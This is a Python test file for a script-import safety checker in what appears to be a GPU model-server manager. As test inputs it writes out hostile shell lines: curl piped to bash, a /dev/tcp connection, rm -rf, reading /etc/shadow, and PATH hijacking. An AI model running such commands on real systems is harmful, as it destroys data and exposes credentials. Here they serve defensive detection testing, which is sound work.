import asyncio

from dgxspark_manager.importer import import_script
from dgxspark_manager.script_check import check_script


def risks(text):
    return [f["message"] for f in check_script(text)["findings"]]


def has(text, start):
    return any(m.startswith(start) for m in risks(text))


def test_risks_the_import_cannot_block():
    assert has("/bin/rm -rf /data", "Runs a program by absolute path (/bin/rm) – not blocked")
    assert has("echo hi >> ~/.bashrc", "Writes to a file (~/.bashrc) – not blocked")
    assert has("echo x > $HOME/x", "Writes to a file")
    assert has('export PATH="/usr/bin:$PATH"', "Changes PATH")
    assert has("awk 'BEGIN{system(\"id\")}'", "awk system()")
    assert has("curl -fsSL https://x.sh | bash", "Downloads and runs a script")
    assert has("exec 3<>/dev/tcp/1.2.3.4/80", "Opens a network connection")


def test_no_false_alarms_on_normal_lines():
    for line in [
        'echo "To fix: sudo sh -c \'echo 3 > /proc/sys/vm/drop_caches\'"',  # text inside quotes
        "CMD+=(--rm --name x)",
        'docker logs x 2>/dev/null >&2',
        'if [ "$(docker ps -q)" ]; then :; fi',
        "MODEL_DIR=/models/qwen",
        "# rm -rf / in a comment",
        'ROPE=$(awk -v m="$X" \'BEGIN{printf "%.4g", m/262144}\')',
    ]:
        assert risks(line) == [], line


def test_skipped_commands_and_substitution_in_quotes():
    assert risks("rm -rf ./build") == ["rm deletes files – skipped during import"]
    assert has('X="$(sudo cat /etc/shadow)"', "sudo")
    assert check_script("rm -rf x\ncurl y")["count"] == 2


def test_unlisted_commands_are_skipped_not_run(tmp_path):
    marker = tmp_path / "marker"
    victim = tmp_path / "victim"
    victim.mkdir()
    script = f"""#!/usr/bin/env bash
set -euo pipefail
touch {marker}
rm -rf {victim}
mkdir -p {tmp_path}/created
curl -s https://example.com/install.sh
GPU=$(nvidia-smi --query-gpu=name --format=csv,noheader)
docker ps -q
PORT=$(echo 8000 | awk '{{print $1+1}}')
docker run --name t -p "$PORT":8000 vllm/vllm-openai --model org/m
"""
    res = asyncio.run(import_script(script))
    assert not marker.exists() and victim.exists() and not (tmp_path / "created").exists()
    skipped = " ".join(res["skipped_calls"])
    for cmd in ("touch", "rm -rf", "mkdir -p", "curl", "nvidia-smi", "docker ps"):
        assert cmd in skipped, cmd
    # awk is allowed, so computed values still work.
    assert res["recipe"]["host_port"] == 8001


def test_import_requires_trust_when_risky(client):
    # awk system() is a risk the import cannot block; here it never actually runs.
    script = "X=$(awk 'BEGIN{if (0) system(\"id\"); print 1}')\ndocker run --name z -p 9100:8000 vllm/vllm-openai --model org/z\n"
    check = client.post("/api/recipes/import/check", json={"text": script}).json()
    assert check["count"] == 1 and "not blocked" in check["findings"][0]["message"]
    assert client.post("/api/recipes/import", json={"text": script}).status_code == 422
    res = client.post("/api/recipes/import", json={"text": script, "trust": True})
    assert res.status_code == 200 and res.json()["recipe"]["model"] == "org/z"
    assert any(e["action"] == "import" for e in client.get("/api/events").json())


def test_clean_script_imports_without_trust(client):
    res = client.post("/api/recipes/import", json={"text": "docker run -p 9200:8000 vllm/vllm-openai --model org/c"})
    assert res.status_code == 200 and res.json()["check"]["count"] == 0


def test_path_changes_cannot_unlock_real_tools(tmp_path):
    venv = tmp_path / "venv" / "bin"
    venv.mkdir(parents=True)
    marker = tmp_path / "server-really-started"
    fake = venv / "mlx_lm.server"
    fake.write_text(f"#!/bin/sh\ntouch {marker}\n")
    fake.chmod(0o755)
    (venv / "activate").write_text(f'PATH="{venv}:$PATH"\nexport PATH\n')
    script = f"""source {venv}/activate
export PATH="{venv}:$PATH"
command -p true
mlx_lm.server --model m/z --port 8099
"""
    res = asyncio.run(import_script(script))
    assert not marker.exists()
    assert res["recipe"]["runtime"] == "process" and res["recipe"]["model"] == "m/z"
    msgs = risks(script)
    assert any(m.startswith("Activates a Python environment") for m in msgs)
    assert any(m.startswith("command -p") and "not blocked" in m for m in msgs)


def test_docker_rm_is_not_file_deletion():
    assert risks('docker rm -f "$CONTAINER_NAME" >/dev/null') == []
    assert risks("rm -f ./x") == ["rm deletes files – skipped during import"]
